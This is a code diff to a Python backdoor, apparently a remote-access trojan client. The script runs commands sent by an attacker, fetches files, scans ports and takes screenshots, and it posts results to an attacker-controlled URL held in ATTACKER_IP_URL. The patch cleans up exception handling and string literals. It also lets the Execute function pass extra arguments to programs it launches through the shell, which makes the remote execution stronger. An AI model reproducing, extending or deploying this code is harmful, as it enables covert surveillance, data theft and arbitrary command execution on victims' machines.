@@ -1,4 +1,4 @@
-﻿from os.path import exists, dirname, realpath
+from os.path import exists, dirname, realpath
 from os import chdir, getcwd, environ, remove
 from sys import argv
 from subprocess import Popen, PIPE, call
@@ -176,7 +176,7 @@ def cd(command):
     directory = ""
     try:
         code,directory = command.split('::')
-    except Exception as e:
+    except Exception:
         httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] Invalid command syntax.\n'))
         return
     
@@ -194,7 +194,7 @@ def GetFile(command):
     filePath = ""
     try:
         get,filePath=command.split('::')
-    except Exception as e:
+    except Exception:
         httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] Invalid command syntax.\n'))
         return
 
@@ -256,7 +256,7 @@ def ScanP(ip, ports):
             else:
                 scan_result = scan_result + "       [CLOSED] " + port + '\n'
             sock.close()
-        except Exception as e:
+        except Exception:
             sock.close()
             httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] An error occured during the scan.\n'))
             pass
@@ -276,7 +276,7 @@ def Execute(command):
         else:
             httpReq(ATTACKER_IP_URL, data="file=" + quote_plus('\n  [ERROR] Unable to find the specified file.\n'))
     elif len(arr) == 3:
-        call('"' + arr[1].replace('"','') + '"', shell=True)
+        call('"' + arr[1].replace('"','') + '" ' + ' '.join(arr[2].split(',')), shell=True)
 
 if __name__ == "__main__":
     ScreenshotCounter = 0
@@ -300,11 +300,11 @@ if __name__ == "__main__":
 
         elif command == 'screens':
             dirpath = ""
-            if exists("C:\Windows"):
+            if exists(r"C:\Windows"):
                 dirpath = environ['TEMP']
             else:
                 dirpath = environ['TMPDIR']
-            dirpath = dirpath + "\Screenshot_" + str(ScreenshotCounter) + ".jpg"
+            dirpath = dirpath + r"\Screenshot_" + str(ScreenshotCounter) + ".jpg"
             ImageGrab.grab().save(dirpath, "JPEG")
             ScreenshotCounter = ScreenshotCounter + 1
             fName = dirpath.replace('"','')
